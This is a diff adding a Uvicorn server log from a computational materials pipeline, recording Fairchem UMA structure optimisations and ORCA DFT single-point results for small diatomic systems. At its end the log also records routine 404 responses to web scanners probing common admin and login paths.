@@ -1,0 +1,2261 @@
+INFO:     Started server process [1688312]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     Uvicorn running on http://0.0.0.0:5550 (Press CTRL+C to quit)
+Fairchem UMA calculator built from checkpoint: /home/grads/jianpengc/projects/materials/R_MetaSymbO/checkpoints/uma-s-1p1.pt
+[TIMER] safe_optimize_with_md_loop started.
+INFO:     128.173.237.144:41764 - "POST /pipeline HTTP/1.1" 500 Internal Server Error
+Fairchem UMA calculator built from checkpoint: /home/grads/jianpengc/projects/materials/R_MetaSymbO/checkpoints/uma-s-1p1.pt
+[TIMER] safe_optimize_with_md_loop started.
+Initial potential energy: -0.7167963666175323
+Pre-relaxing to 0 K...
+Initial potential energy after pre-relax: -0.7455987614844757
+Starting optimization loop...
+Loop 1/1: Annealing and quenching...
+  Starting energy after perturbation: -0.734157 eV
+Relaxing to 0 K...
+Loop 1/1: Final energy = -3.093439 eV (best so far: -0.745599 eV)
+  *** NEW BEST STRUCTURE! Improvement: 0.000000 eV ***
+
+Optimization completed. Best energy: -3.093439 eV
+[TIMER] safe_optimize_with_md_loop finished in 111.553 s.
+UMA optimization done. results: {'uma': {'energy_eV': -3.0934389514182525, 'traj': './_mdopt/best.traj', 'xyz': './_mdopt/best.xyz'}}
+Starting ORCA DFT single-point calculation...
+[TIMER] ORCA DFT Single-Point started.
+Warning: If you are reading in an engrad file from a
+              geometry optimization, check very carefully.
+              ORCA does not by default supply the forces for the
+              converged geometry!
+[TIMER] ORCA DFT Single-Point finished in 8.562 s.
+ORCA DFT done. results: {'dipole_vec_D': [0.0007855670812708659, 0.0014564161215155913, 0.0018746188098308636], 'dipole_D': 0.002500491799698337, 'energy_hartree': -2020.996091206316, 'energy_eV': -54994.10523944705, 'homo_eV': -3.009, 'lumo_eV': -2.6848, 'gap_eV': 0.3241999999999998, 'mulliken_block': '   0 Al:   -0.000002    1.000000\n   1 Zn:    0.000002    0.000000\nSum of atomic charges         :    0.0000000\nSum of atomic spin populations:    1.0000000', 'forces': [[0.001092924253986606, 0.0009548870113551211, 0.0005884617944873588], [-0.001092934486977957, -0.0009549142136286118, -0.0005885065316857275]]}
+INFO:     128.173.237.144:42916 - "POST /pipeline HTTP/1.1" 200 OK
+Fairchem UMA calculator built from checkpoint: /home/grads/jianpengc/projects/materials/R_MetaSymbO/checkpoints/uma-s-1p1.pt
+[TIMER] safe_optimize_with_md_loop started.
+Initial potential energy: 29.972626240804342
+Pre-relaxing to 0 K...
+Initial potential energy after pre-relax: -0.7194351834510284
+Starting optimization loop...
+Loop 1/1: Annealing and quenching...
+  Starting energy after perturbation: -0.718392 eV
+Relaxing to 0 K...
+Loop 1/1: Final energy = -0.753927 eV (best so far: -0.719435 eV)
+  *** NEW BEST STRUCTURE! Improvement: 0.000000 eV ***
+
+Optimization completed. Best energy: -0.753927 eV
+[TIMER] safe_optimize_with_md_loop finished in 112.893 s.
+UMA optimization done. results: {'uma': {'energy_eV': -0.7539267224524933, 'traj': './_mdopt/best.traj', 'xyz': './_mdopt/best.xyz'}}
+Starting ORCA DFT single-point calculation...
+[TIMER] ORCA DFT Single-Point started.
+Warning: If you are reading in an engrad file from a
+              geometry optimization, check very carefully.
+              ORCA does not by default supply the forces for the
+              converged geometry!
+[TIMER] ORCA DFT Single-Point finished in 7.337 s.
+ORCA DFT done. results: {'dipole_vec_D': [0.0041070714667963415, 0.004411462775467001, 0.0035992462376053247], 'dipole_D': 0.007020228866042742, 'energy_hartree': -2020.99606896382, 'energy_eV': -54994.10463419791, 'homo_eV': -3.0069, 'lumo_eV': -2.6853, 'gap_eV': 0.3216000000000001, 'mulliken_block': '   0 Al:   -0.000108    1.000021\n   1 Zn:    0.000108   -0.000021\nSum of atomic charges         :   -0.0000000\nSum of atomic spin populations:    1.0000000', 'forces': [[0.004022311220918032, 0.004352084279603645, 0.0035346988986291947], [-0.004022297336959918, -0.00435209055309583, -0.003534722244247654]]}
+INFO:     128.173.237.144:43516 - "POST /pipeline HTTP/1.1" 200 OK
+Fairchem UMA calculator built from checkpoint: /home/grads/jianpengc/projects/materials/R_MetaSymbO/checkpoints/uma-s-1p1.pt
+[TIMER] safe_optimize_with_md_loop started.
+Initial potential energy: 0.5411969438489237
+Pre-relaxing to 0 K...
+Initial potential energy after pre-relax: -4.161453603178664
+Starting optimization loop...
+Loop 1/1: Annealing and quenching...
+  Starting energy after perturbation: -4.149660 eV
+Relaxing to 0 K...
+Loop 1/1: Final energy = -4.163990 eV (best so far: -4.161454 eV)
+  *** NEW BEST STRUCTURE! Improvement: 0.000000 eV ***
+
+Optimization completed. Best energy: -4.163990 eV
+[TIMER] safe_optimize_with_md_loop finished in 113.341 s.
+UMA optimization done. results: {'uma': {'energy_eV': -4.163990138441726, 'traj': './_mdopt/best.traj', 'xyz': './_mdopt/best.xyz'}}
+Starting ORCA DFT single-point calculation...
+[TIMER] ORCA DFT Single-Point started.
+Warning: If you are reading in an engrad file from a
+              geometry optimization, check very carefully.
+              ORCA does not by default supply the forces for the
+              converged geometry!
+[TIMER] ORCA DFT Single-Point finished in 24.189 s.
+ORCA DFT done. results: {'dipole_vec_D': [0.03308485698088526, 0.06394476584624309, -0.004536441878960795], 'dipole_D': 0.072139587921596, 'energy_hartree': -3147.849872099233, 'energy_eV': -85657.35871407615, 'homo_eV': -4.0232, 'lumo_eV': -2.8004, 'gap_eV': 1.2228000000000003, 'mulliken_block': '   0 Ni:    0.027683    1.116142\n   1 Cu:   -0.027683   -0.116142\nSum of atomic charges         :   -0.0000000\nSum of atomic spin populations:    1.0000000', 'forces': [[0.519101235040253, 1.0227619042887668, -0.08801499928979337], [-0.5191012169911073, -1.0227618954441713, 0.08801500602608414]]}
+INFO:     128.173.237.144:34092 - "POST /pipeline HTTP/1.1" 200 OK
+Fairchem UMA calculator built from checkpoint: /home/grads/jianpengc/projects/materials/R_MetaSymbO/checkpoints/uma-s-1p1.pt
+[TIMER] safe_optimize_with_md_loop started.
+Initial potential energy: 38.14361313125087
+Pre-relaxing to 0 K...
+Initial potential energy after pre-relax: -2.181256501470072
+Starting optimization loop...
+Loop 1/1: Annealing and quenching...
+  Starting energy after perturbation: -2.128495 eV
+Relaxing to 0 K...
+Loop 1/1: Final energy = -2.159893 eV (best so far: -2.181257 eV)
+  No improvement (ΔE = 0.021364 eV)
+
+Optimization completed. Best energy: -2.181257 eV
+[TIMER] safe_optimize_with_md_loop finished in 113.869 s.
+UMA optimization done. results: {'uma': {'energy_eV': -2.181256501470072, 'traj': './_mdopt/best.traj', 'xyz': './_mdopt/best.xyz'}}
+Starting ORCA DFT single-point calculation...
+[TIMER] ORCA DFT Single-Point started.
+Warning: If you are reading in an engrad file from a
+              geometry optimization, check very carefully.
+              ORCA does not by default supply the forces for the
+              converged geometry!
+[TIMER] ORCA DFT Single-Point finished in 15.864 s.
+ORCA DFT done. results: {'dipole_vec_D': [-0.10599712177388029, -0.05848301397448184, 0.5904991338023882], 'dipole_D': 0.6027809550485624, 'energy_hartree': -488.972093670026, 'energy_eV': -13305.608504364502, 'mulliken_block': '   0 Mg:    0.040556\n   1 Si:   -0.040556\nSum of atomic charges:   -0.0000000', 'forces': [[-0.12471385354253482, -0.04296453676276278, -0.7117200163744899], [0.12471385349111276, 0.04296453681418485, 0.7117200158602692]]}
+INFO:     128.173.237.144:47220 - "POST /pipeline HTTP/1.1" 200 OK
+Fairchem UMA calculator built from checkpoint: /home/grads/jianpengc/projects/materials/R_MetaSymbO/checkpoints/uma-s-1p1.pt
+[TIMER] safe_optimize_with_md_loop started.
+INFO:     128.173.237.144:50572 - "POST /pipeline HTTP/1.1" 500 Internal Server Error
+Fairchem UMA calculator built from checkpoint: /home/grads/jianpengc/projects/materials/R_MetaSymbO/checkpoints/uma-s-1p1.pt
+[TIMER] safe_optimize_with_md_loop started.
+Initial potential energy: 17.368997476998917
+Pre-relaxing to 0 K...
+Initial potential energy after pre-relax: -6.239360190924057
+Starting optimization loop...
+Loop 1/5: Annealing and quenching...
+  Starting energy after perturbation: -6.135722 eV
+Fairchem UMA calculator built from checkpoint: /home/grads/jianpengc/projects/materials/R_MetaSymbO/checkpoints/uma-s-1p1.pt
+[TIMER] safe_optimize_with_md_loop started.
+INFO:     128.173.237.144:39208 - "POST /pipeline HTTP/1.1" 500 Internal Server Error
+Fairchem UMA calculator built from checkpoint: /home/grads/jianpengc/projects/materials/R_MetaSymbO/checkpoints/uma-s-1p1.pt
+[TIMER] safe_optimize_with_md_loop started.
+Initial potential energy: -2.686882949659271
+Pre-relaxing to 0 K...
+Initial potential energy after pre-relax: -5.813834167310638
+Starting optimization loop...
+Loop 1/5: Annealing and quenching...
+  Starting energy after perturbation: -5.548023 eV
+Fairchem UMA calculator built from checkpoint: /home/grads/jianpengc/projects/materials/R_MetaSymbO/checkpoints/uma-s-1p1.pt
+[TIMER] safe_optimize_with_md_loop started.
+Initial potential energy: -3.6742827172326757
+Pre-relaxing to 0 K...
+Initial potential energy after pre-relax: -5.146937238697977
+Starting optimization loop...
+Loop 1/5: Annealing and quenching...
+  Starting energy after perturbation: -5.004155 eV
+Fairchem UMA calculator built from checkpoint: /home/grads/jianpengc/projects/materials/R_MetaSymbO/checkpoints/uma-s-1p1.pt
+[TIMER] safe_optimize_with_md_loop started.
+INFO:     128.173.237.144:60820 - "POST /pipeline HTTP/1.1" 500 Internal Server Error
+Fairchem UMA calculator built from checkpoint: /home/grads/jianpengc/projects/materials/R_MetaSymbO/checkpoints/uma-s-1p1.pt
+[TIMER] safe_optimize_with_md_loop started.
+INFO:     128.173.237.144:52438 - "POST /pipeline HTTP/1.1" 500 Internal Server Error
+Fairchem UMA calculator built from checkpoint: /home/grads/jianpengc/projects/materials/R_MetaSymbO/checkpoints/uma-s-1p1.pt
+[TIMER] safe_optimize_with_md_loop started.
+INFO:     128.173.237.144:56526 - "POST /pipeline HTTP/1.1" 500 Internal Server Error
+Fairchem UMA calculator built from checkpoint: /home/grads/jianpengc/projects/materials/R_MetaSymbO/checkpoints/uma-s-1p1.pt
+[TIMER] safe_optimize_with_md_loop started.
+Initial potential energy: 35.74035507719901
+Pre-relaxing to 0 K...
+Initial potential energy after pre-relax: -10.14116328675362
+Starting optimization loop...
+Loop 1/1: Annealing and quenching...
+  Starting energy after perturbation: -10.063004 eV
+Relaxing to 0 K...
+Loop 1/5: Final energy = -6.239580 eV (best so far: -6.239360 eV)
+  No improvement (ΔE = -0.000220 eV)
+Loop 2/5: Annealing and quenching...
+  Starting energy after perturbation: -5.900721 eV
+Fairchem UMA calculator built from checkpoint: /home/grads/jianpengc/projects/materials/R_MetaSymbO/checkpoints/uma-s-1p1.pt
+[TIMER] safe_optimize_with_md_loop started.
+Initial potential energy: 28.943548741749797
+Pre-relaxing to 0 K...
+Fairchem UMA calculator built from checkpoint: /home/grads/jianpengc/projects/materials/R_MetaSymbO/checkpoints/uma-s-1p1.pt
+[TIMER] safe_optimize_with_md_loop started.
+INFO:     128.173.237.144:40074 - "POST /pipeline HTTP/1.1" 500 Internal Server Error
+Fairchem UMA calculator built from checkpoint: /home/grads/jianpengc/projects/materials/R_MetaSymbO/checkpoints/uma-s-1p1.pt
+[TIMER] safe_optimize_with_md_loop started.
+Initial potential energy: -0.614385573313089
+Pre-relaxing to 0 K...
+Initial potential energy after pre-relax: -0.760172812387796
+Starting optimization loop...
+Loop 1/1: Annealing and quenching...
+Initial potential energy after pre-relax: -9.652221140452351
+Starting optimization loop...
+Loop 1/1: Annealing and quenching...
+  Starting energy after perturbation: -9.540826 eV
+  Starting energy after perturbation: -0.767681 eV
+Fairchem UMA calculator built from checkpoint: /home/grads/jianpengc/projects/materials/R_MetaSymbO/checkpoints/uma-s-1p1.pt
+[TIMER] safe_optimize_with_md_loop started.
+Initial potential energy: -0.7183804196570831
+Pre-relaxing to 0 K...
+Initial potential energy after pre-relax: -0.7183804196570831
+Starting optimization loop...
+Loop 1/1: Annealing and quenching...
+  Starting energy after perturbation: -0.720671 eV
+Relaxing to 0 K...
+Loop 1/1: Final energy = -10.156057 eV (best so far: -10.141163 eV)
+  *** NEW BEST STRUCTURE! Improvement: 0.000000 eV ***
+
+Optimization completed. Best energy: -10.156057 eV
+[TIMER] safe_optimize_with_md_loop finished in 2405.173 s.
+UMA optimization done. results: {'uma': {'energy_eV': -10.156057295390095, 'traj': './_mdopt/best.traj', 'xyz': './_mdopt/best.xyz'}}
+Starting ORCA DFT single-point calculation...
+[TIMER] ORCA DFT Single-Point started.
+Relaxing to 0 K...
+Loop 1/5: Final energy = -5.813825 eV (best so far: -5.813834 eV)
+  No improvement (ΔE = 0.000010 eV)
+Loop 2/5: Annealing and quenching...
+  Starting energy after perturbation: -4.795377 eV
+Fairchem UMA calculator built from checkpoint: /home/grads/jianpengc/projects/materials/R_MetaSymbO/checkpoints/uma-s-1p1.pt
+[TIMER] safe_optimize_with_md_loop started.
+Initial potential energy: -0.7631816548560577
+Pre-relaxing to 0 K...
+Initial potential energy after pre-relax: -0.7631816548560577
+Starting optimization loop...
+Loop 1/1: Annealing and quenching...
+  Starting energy after perturbation: -0.757309 eV
+Relaxing to 0 K...
+Loop 2/5: Final energy = -6.239320 eV (best so far: -6.239360 eV)
+  No improvement (ΔE = 0.000040 eV)
+Loop 3/5: Annealing and quenching...
+  Starting energy after perturbation: -5.645875 eV
+Relaxing to 0 K...
+Fairchem UMA calculator built from checkpoint: /home/grads/jianpengc/projects/materials/R_MetaSymbO/checkpoints/uma-s-1p1.pt
+[TIMER] safe_optimize_with_md_loop started.
+Loop 1/1: Final energy = -10.188279 eV (best so far: -9.652221 eV)
+  *** NEW BEST STRUCTURE! Improvement: 0.000000 eV ***
+
+Optimization completed. Best energy: -10.188279 eV
+[TIMER] safe_optimize_with_md_loop finished in 3751.733 s.
+UMA optimization done. results: {'uma': {'energy_eV': -10.188279089518513, 'traj': './_mdopt/best.traj', 'xyz': './_mdopt/best.xyz'}}
+Starting ORCA DFT single-point calculation...
+[TIMER] ORCA DFT Single-Point started.
+Initial potential energy: 68.09500534581665
+Pre-relaxing to 0 K...
+Relaxing to 0 K...
+Loop 1/1: Final energy = -1.677909 eV (best so far: -0.763182 eV)
+  *** NEW BEST STRUCTURE! Improvement: 0.000000 eV ***
+
+Optimization completed. Best energy: -1.677909 eV
+[TIMER] safe_optimize_with_md_loop finished in 2081.797 s.
+UMA optimization done. results: {'uma': {'energy_eV': -1.6779086274360138, 'traj': './_mdopt/best.traj', 'xyz': './_mdopt/best.xyz'}}
+Starting ORCA DFT single-point calculation...
+[TIMER] ORCA DFT Single-Point started.
+Relaxing to 0 K...
+Loop 2/5: Final energy = -5.813835 eV (best so far: -5.813834 eV)
+  No improvement (ΔE = -0.000001 eV)
+Loop 3/5: Annealing and quenching...
+  Starting energy after perturbation: -5.100136 eV
+Relaxing to 0 K...
+Loop 1/1: Final energy = -2.529757 eV (best so far: -0.760173 eV)
+  *** NEW BEST STRUCTURE! Improvement: 0.000000 eV ***
+
+Optimization completed. Best energy: -2.529757 eV
+[TIMER] safe_optimize_with_md_loop finished in 6357.662 s.
+UMA optimization done. results: {'uma': {'energy_eV': -2.5297574681495147, 'traj': './_mdopt/best.traj', 'xyz': './_mdopt/best.xyz'}}
+Starting ORCA DFT single-point calculation...
+[TIMER] ORCA DFT Single-Point started.
+Warning: If you are reading in an engrad file from a
+              geometry optimization, check very carefully.
+              ORCA does not by default supply the forces for the
+              converged geometry!
+[TIMER] ORCA DFT Single-Point finished in 7.834 s.
+ORCA DFT done. results: {'dipole_vec_D': [0.0005114375068338006, -0.00010753795254769827, 0.00021921217103493262], 'dipole_D': 0.0005667333681409393, 'energy_hartree': -2020.995928339138, 'energy_eV': -54994.10080760536, 'homo_eV': -3.0078, 'lumo_eV': -2.683, 'gap_eV': 0.3248000000000002, 'mulliken_block': '   0 Al:   -0.000000    1.000000\n   1 Zn:    0.000000   -0.000000\nSum of atomic charges         :    0.0000000\nSum of atomic spin populations:    1.0000000', 'forces': [[-0.0001968707722517166, 4.136262521590537e-05, -8.441487671226975e-05], [0.00019685015200281332, -4.136684182540679e-05, 8.438309787480784e-05]]}
+Initial potential energy after pre-relax: -5.179482626442881
+Starting optimization loop...
+Loop 1/1: Annealing and quenching...
+  Starting energy after perturbation: -5.111203 eV
+Relaxing to 0 K...
+Loop 3/5: Final energy = -6.239409 eV (best so far: -6.239360 eV)
+  No improvement (ΔE = -0.000049 eV)
+Loop 4/5: Annealing and quenching...
+  Starting energy after perturbation: -6.121189 eV
+Relaxing to 0 K...
+Loop 1/5: Final energy = -5.810953 eV (best so far: -5.146937 eV)
+  *** NEW BEST STRUCTURE! Improvement: 0.000000 eV ***
+Loop 2/5: Annealing and quenching...
+  Starting energy after perturbation: -5.802106 eV
+Relaxing to 0 K...
+Loop 1/1: Final energy = -4.188662 eV (best so far: -0.718380 eV)
+  *** NEW BEST STRUCTURE! Improvement: 0.000000 eV ***
+
+Optimization completed. Best energy: -4.188662 eV
+[TIMER] safe_optimize_with_md_loop finished in 7236.344 s.
+UMA optimization done. results: {'uma': {'energy_eV': -4.188661961004587, 'traj': './_mdopt/best.traj', 'xyz': './_mdopt/best.xyz'}}
+Starting ORCA DFT single-point calculation...
+[TIMER] ORCA DFT Single-Point started.
+Warning: If you are reading in an engrad file from a
+              geometry optimization, check very carefully.
+              ORCA does not by default supply the forces for the
+              converged geometry!
+[TIMER] ORCA DFT Single-Point finished in 10.047 s.
+ORCA DFT done. results: {'dipole_vec_D': [0.4613249217295601, -0.004934937062005134, -0.37755385233970595], 'dipole_D': 0.5961475894685335, 'energy_hartree': -2021.013552365689, 'energy_eV': -54994.58038179906, 'homo_eV': -2.9707, 'lumo_eV': -2.6832, 'gap_eV': 0.2875000000000001, 'mulliken_block': '   0 Al:   -0.117248    0.982400\n   1 Zn:    0.117248    0.017600\nSum of atomic charges         :   -0.0000000\nSum of atomic spin populations:    1.0000000', 'forces': [[0.2922323575231604, -0.002794595999395363, -0.23754434521388806], [-0.29223239351860736, 0.002794567562992262, 0.23754433384961118]]}
+Fairchem UMA calculator built from checkpoint: /home/grads/jianpengc/projects/materials/R_MetaSymbO/checkpoints/uma-s-1p1.pt
+[TIMER] safe_optimize_with_md_loop started.
+Initial potential energy: -0.7167963666175323
+Pre-relaxing to 0 K...
+Initial potential energy after pre-relax: -0.7455987614844757
+Starting optimization loop...
+Loop 1/1: Annealing and quenching...
+  Starting energy after perturbation: -0.721449 eV
+Relaxing to 0 K...
+Loop 3/5: Final energy = -5.813828 eV (best so far: -5.813834 eV)
+  No improvement (ΔE = 0.000006 eV)
+Loop 4/5: Annealing and quenching...
+  Starting energy after perturbation: -4.214384 eV
+Relaxing to 0 K...
+Loop 4/5: Final energy = -6.239503 eV (best so far: -6.239360 eV)
+  No improvement (ΔE = -0.000142 eV)
+Loop 5/5: Annealing and quenching...
+  Starting energy after perturbation: -6.123952 eV
+Relaxing to 0 K...
+Relaxing to 0 K...
+Loop 1/1: Final energy = -2.563023 eV (best so far: -0.745599 eV)
+  *** NEW BEST STRUCTURE! Improvement: 0.000000 eV ***
+
+Optimization completed. Best energy: -2.563023 eV
+[TIMER] safe_optimize_with_md_loop finished in 2147.731 s.
+UMA optimization done. results: {'uma': {'energy_eV': -2.5630230588172394, 'traj': './_mdopt/best.traj', 'xyz': './_mdopt/best.xyz'}}
+Starting ORCA DFT single-point calculation...
+[TIMER] ORCA DFT Single-Point started.
+Warning: If you are reading in an engrad file from a
+              geometry optimization, check very carefully.
+              ORCA does not by default supply the forces for the
+              converged geometry!
+[TIMER] ORCA DFT Single-Point finished in 19.533 s.
+ORCA DFT done. results: {'dipole_vec_D': [0.0012133978097406128, 0.0010050173810967067, 0.0005785395410082828], 'dipole_D': 0.001678422527702686, 'energy_hartree': -2020.995873795111, 'energy_eV': -54994.099323386785, 'homo_eV': -3.0066, 'lumo_eV': -2.6819, 'gap_eV': 0.3247, 'mulliken_block': '   0 Al:   -0.000000    1.000000\n   1 Zn:    0.000000   -0.000000\nSum of atomic charges         :   -0.0000000\nSum of atomic spin populations:    1.0000000', 'forces': [[-0.0006969625103144742, -0.000569939771609636, -0.00032064805861420625], [0.0006969532029203309, 0.0005699048560260816, 0.00032062589570329024]]}
+INFO:     128.173.237.144:50990 - "POST /pipeline HTTP/1.1" 200 OK
+Loop 1/1: Final energy = -5.174869 eV (best so far: -5.179483 eV)
+  No improvement (ΔE = 0.004614 eV)
+
+Optimization completed. Best energy: -5.179483 eV
+[TIMER] safe_optimize_with_md_loop finished in 8070.134 s.
+UMA optimization done. results: {'uma': {'energy_eV': -5.179482626442881, 'traj': './_mdopt/best.traj', 'xyz': './_mdopt/best.xyz'}}
+Starting ORCA DFT single-point calculation...
+[TIMER] ORCA DFT Single-Point started.
+Warning: If you are reading in an engrad file from a
+              geometry optimization, check very carefully.
+              ORCA does not by default supply the forces for the
+              converged geometry!
+[TIMER] ORCA DFT Single-Point finished in 6.977 s.
+ORCA DFT done. results: {'dipole_vec_D': [-0.9037408115904242, -3.084480518521553, -0.00024596282487863996], 'dipole_D': 3.2141511451969427, 'energy_hartree': -622.043907476857, 'energy_eV': -16926.67702831638, 'mulliken_block': '   0 Na:    0.490758\n   1 Cl:   -0.490758\nSum of atomic charges:    0.0000000', 'forces': [[0.22694768029224668, 0.763780870133903, 7.040354613765685e-05], [-0.2269476799837143, -0.763780870236747, -7.040364898179105e-05]]}
+Fairchem UMA calculator built from checkpoint: /home/grads/jianpengc/projects/materials/R_MetaSymbO/checkpoints/uma-s-1p1.pt
+[TIMER] safe_optimize_with_md_loop started.
+Initial potential energy: -1.0027589451894094
+Pre-relaxing to 0 K...
+Initial potential energy after pre-relax: -1.842289174757891
+Starting optimization loop...
+Loop 1/1: Annealing and quenching...
+  Starting energy after perturbation: -1.625796 eV
+Relaxing to 0 K...
+Loop 5/5: Final energy = -6.239521 eV (best so far: -6.239360 eV)
+  No improvement (ΔE = -0.000160 eV)
+
+Optimization completed. Best energy: -6.239360 eV
+[TIMER] safe_optimize_with_md_loop finished in 17452.000 s.
+UMA optimization done. results: {'uma': {'energy_eV': -6.239360190924057, 'traj': './_mdopt/best.traj', 'xyz': './_mdopt/best.xyz'}}
+Starting ORCA DFT single-point calculation...
+[TIMER] ORCA DFT Single-Point started.
+Relaxing to 0 K...
+Loop 4/5: Final energy = -5.813836 eV (best so far: -5.813834 eV)
+  No improvement (ΔE = -0.000002 eV)
+Loop 5/5: Annealing and quenching...
+  Starting energy after perturbation: 3.813769 eV
+Relaxing to 0 K...
+Loop 1/1: Final energy = -3.215574 eV (best so far: -1.842289 eV)
+  *** NEW BEST STRUCTURE! Improvement: 0.000000 eV ***
+
+Optimization completed. Best energy: -3.215574 eV
+[TIMER] safe_optimize_with_md_loop finished in 2057.348 s.
+UMA optimization done. results: {'uma': {'energy_eV': -3.2155736338719656, 'traj': './_mdopt/best.traj', 'xyz': './_mdopt/best.xyz'}}
+Starting ORCA DFT single-point calculation...
+[TIMER] ORCA DFT Single-Point started.
+Warning: If you are reading in an engrad file from a
+              geometry optimization, check very carefully.
+              ORCA does not by default supply the forces for the
+              converged geometry!
+[TIMER] ORCA DFT Single-Point finished in 13.360 s.
+ORCA DFT done. results: {'dipole_vec_D': [0.3118629187567237, -0.030771980851924674, 0.06862025152303097], 'dipole_D': 0.3208023282647713, 'energy_hartree': -1786.993190303029, 'energy_eV': -48626.561920286054, 'mulliken_block': '   0 Ag:   -0.087514\n   1 Cu:    0.087514\nSum of atomic charges:   -0.0000000', 'forces': [[1.2297809700905635, -0.11937906656424686, 0.2700921736181552], [-1.2297809511672426, 0.1193790764887058, -0.27009217181838285]]}
+INFO:     128.173.237.144:40198 - "POST /pipeline HTTP/1.1" 200 OK
+Relaxing to 0 K...
+Loop 2/5: Final energy = -5.810784 eV (best so far: -5.810953 eV)
+  No improvement (ΔE = 0.000169 eV)
+Loop 3/5: Annealing and quenching...
+  Starting energy after perturbation: -5.810619 eV
+Relaxing to 0 K...
+Loop 5/5: Final energy = -4.152209 eV (best so far: -5.813834 eV)
+  No improvement (ΔE = 1.661625 eV)
+
+Optimization completed. Best energy: -5.813834 eV
+[TIMER] safe_optimize_with_md_loop finished in 19928.151 s.
+UMA optimization done. results: {'uma': {'energy_eV': -5.813834167310638, 'traj': './_mdopt/best.traj', 'xyz': './_mdopt/best.xyz'}}
+Starting ORCA DFT single-point calculation...
+[TIMER] ORCA DFT Single-Point started.
+Relaxing to 0 K...
+Loop 3/5: Final energy = -5.811042 eV (best so far: -5.810953 eV)
+  No improvement (ΔE = -0.000089 eV)
+Loop 4/5: Annealing and quenching...
+  Starting energy after perturbation: -5.789212 eV
+Relaxing to 0 K...
+Loop 4/5: Final energy = -5.811258 eV (best so far: -5.810953 eV)
+  No improvement (ΔE = -0.000304 eV)
+Loop 5/5: Annealing and quenching...
+  Starting energy after perturbation: -5.784004 eV
+Relaxing to 0 K...
+Loop 5/5: Final energy = -5.810641 eV (best so far: -5.810953 eV)
+  No improvement (ΔE = 0.000312 eV)
+
+Optimization completed. Best energy: -5.810953 eV
+[TIMER] safe_optimize_with_md_loop finished in 22211.673 s.
+UMA optimization done. results: {'uma': {'energy_eV': -5.810953425888987, 'traj': './_mdopt/best.traj', 'xyz': './_mdopt/best.xyz'}}
+Starting ORCA DFT single-point calculation...
+[TIMER] ORCA DFT Single-Point started.
+INFO:     40.77.167.219:32036 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     207.46.13.107:9995 - "GET / HTTP/1.1" 404 Not Found
+INFO:     114.250.48.130:17470 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     4.227.36.68:49710 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     20.171.207.12:42692 - "GET / HTTP/1.1" 404 Not Found
+INFO:     3.210.114.189:11925 - "GET /robots.txt HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     198.82.145.75:38096 - "GET / HTTP/1.0" 404 Not Found
+INFO:     198.82.145.75:38098 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38118 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38120 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38122 - "GET /properties/description.dhtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38124 - "GET /login/?next=/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38128 - "GET /properties/configuration.php?tab=Status HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38136 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38148 - "GET /header.php?tab=status HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38160 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38164 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38170 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38176 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38184 - "GET /login.php HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38186 - "GET /login.html HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38196 - "GET /this_server/all_settings.shtml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38198 - "GET /Home.do HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38202 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38212 - "GET // HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38218 - "GET /authenticate/login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38226 - "GET /intruvert/jsp/admin/Login.jsp HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38228 - "GET /start.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38230 - "GET /commoncgi/servlet/CCGIServlet?ApHost=PDT_InterScan_NT&CGIAlias=PDT_InterScan_NT&File=logout.htm HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38236 - "GET /tmui/ HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38256 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38246 - "GET /xmldata?item=All HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38280 - "GET /upnp/BasicDevice.xml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38266 - "GET /netmri/config/userAdmin/login.tdf HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38308 - "GET /scgi-bin/platform.cgi HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38296 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38314 - "GET /admin/login.do HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38326 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38338 - "GET /en/main.js HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38344 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38354 - "GET /mgmt/login?dest=%2Fmgmt%2Fgui%3Fp%3Dhome&reason=&username= HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38364 - "GET /.cobalt HTTP/1.1" 404 Not Found
+INFO:     198.82.145.75:38378 - "GET /admin.back HTTP/1.1" 404 Not Found
